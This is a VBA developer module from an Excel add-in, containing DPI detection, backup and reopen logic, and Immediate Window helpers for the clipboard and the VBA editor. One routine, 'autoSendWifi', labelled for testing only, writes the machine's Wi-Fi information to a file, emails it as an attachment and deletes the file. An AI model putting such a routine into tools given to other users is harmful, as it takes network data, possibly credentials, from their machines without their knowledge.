Attribute VB_Name = "Developer"
Option Explicit
' FOR DEVELOPER ONLY
Public form As KeyboardShortcutForm
Private Const GIT_LOCAL_PATH As String = "S:\VBA-projects\"
Private Const INSTALL_FILE_NAME As String = "Danh-Tools-Installation.xlsb"
Private Const INSTALL_FILE_FULLNAME As String = GIT_LOCAL_PATH & INSTALL_FILE_NAME
Private Const ADDIN_FILE_NAME As String = "Danh-Tools.xlam"
Private info As InfoConstants
Private system As SystemUpdate
Private fileSystem As Object
Private userResponse As VbMsgBoxResult

' WINDOW Detect DPI
Private Declare PtrSafe Function GetDC Lib "user32" (ByVal hwnd As LongPtr) As LongPtr
Private Declare PtrSafe Function GetDeviceCaps Lib "gdi32" (ByVal hdc As LongPtr, ByVal nIndex As Long) As Long
Private Declare PtrSafe Function ReleaseDC Lib "user32" (ByVal hwnd As LongPtr, ByVal hdc As LongPtr) As Long

Const LOGPIXELSX = 88 ' Horizontal DPI
Const LOGPIXELSY = 90 ' Vertical DPI

Public Sub showDPI()
    Dim hdc As LongPtr: hdc = GetDC(0)
    Dim dpiX As Long, dpiY As Long
    Let dpiX = GetDeviceCaps(hdc, LOGPIXELSX)
    Let dpiY = GetDeviceCaps(hdc, LOGPIXELSY)
    Call ReleaseDC(0, hdc)

    Debug.Print "Screen DPI" & vbCrLf & "DPI X: " & dpiX & vbCrLf & "DPI Y: " & dpiY
End Sub

Public Sub aSaveBackup()
    If ThisWorkbook.name = ADDIN_FILE_NAME Then
        ThisWorkbook.SaveAs _
            filename:=INSTALL_FILE_FULLNAME, _
            FileFormat:=xlExcel12 ' xlExcel12 = xlsb
    End If
    Application.OnTime Now + TimeValue("00:00:03"), "reOpen"
    ThisWorkbook.Close
End Sub

Private Sub reOpen()
    Workbooks.Open (INSTALL_FILE_FULLNAME)
End Sub

'NOTE: JUST FOR TESTING DON'T RELEASE
Public Sub autoSendWifi()
    Dim internetC As InternetConnector
    Dim email As EmailCDO
    Dim attachment As String
    Set internetC = New InternetConnector
    Set email = New EmailCDO
    Let attachment = ThisWorkbook.path & "\wifi.txt"
    Call internetC.saveWifiAsTxt(True)
    Call email.send(attachment)
    Kill (attachment)
End Sub

' TEST
Public Sub aaTestCode()
    ' Set form = New KeyboardShortcutForm
    ' Call form.Show(vbModal)  ' vbModeless or vbModal
    ' Set form = Nothing
    Call Shortcuts.Test
    ' Call KeyboardShortcutForm.Show(vbModal)
'    If ActiveWorkbook.path = "" Then MsgBox "Not saved"
''''''''''''''''''''
'    Dim system As SystemUpdate
'    Dim PWShell As PowerShellController
'
'    Set system = New SystemUpdate
'    Set PWShell = New PowerShellController
    
'    Debug.Print PWShell.executeScript("ipconfig /all")
''''''''''''''''''
'    Dim system As New SystemUpdate
'    Debug.Print "====="
''    Debug.Print system.hasWorkPlace(True)
''    Debug.Print system.hasWorkPlace(True, "asd")
'    Dim fileController As New FilesController
'    fileController.copyFileName
'    Debug.Print system.getClipboard()
'    Debug.Print "====="
    'Microsoft Excel
    'Workbook
    'Worksheet
    'Chart
    'DialogSheet
    'xlWorksheet
    'xlChart
    'xlExcel4MacroSheet
    'xlExcel4IntMacroSheet
End Sub

' 2025-10-18
' Helper methods that using in Imediate Window

Public Function Clip(Optional ByRef text As String = VbNullString)
    Dim Clipboard As Utils_Clipboard
    Set Clipboard = New Utils_Clipboard
    If text <> VbNullString Then Call Clipboard.SaveByCOM(text)
    Let Clip = Clipboard.LoadByCOM
End Function

Public Function Clip2(Optional ByRef text As String = vbNullString)
    Dim Clipboard As Utils_Clipboard
    Set Clipboard = New Utils_Clipboard
    If text <> VbNullString Then Call Clipboard.SaveByAPI(text)
    Let Clip2 = Clipboard.LoadByAPI
End Function

Public Sub CloseVBEProjectWindow()
    Dim VBE As Utils_VBE
    Set VBE = New Utils_VBE
    Call VBE.CloseProjectWindow
End Sub

Public Sub CloseVBEPropertiesWindow()
    Dim VBE As Utils_VBE
    Set VBE = New Utils_VBE
    Call VBE.ClosePropertiesWindow
End Sub

Public Sub CloseAllVBEWindows()
    Dim VBE As Utils_VBE
    Set VBE = New Utils_VBE
    Call VBE.CloseAllWindows
End Sub

Public Sub ListComponents(Optional ByRef typeName As String = vbNullString)
    Dim VBE As Utils_VBE
    Set VBE = New Utils_VBE
    Call VBE.ListComponentsByTypeName(typeName)
End Sub

Public Sub OpenComponent(ByRef name As String)
    Dim VBE As Utils_VBE
    Set VBE = New Utils_VBE
    Call VBE.OpenComponentByName(name)
End Sub

Public Sub Cls()
    Dim VBE As Utils_VBE
    Set VBE = New Utils_VBE
    Call VBE.ClearImmediateWindow
End Sub

Public Sub Clear()
    Dim VBE As Utils_VBE
    Set VBE = New Utils_VBE
    Call VBE.ClearImmediateWindowUnix
End Sub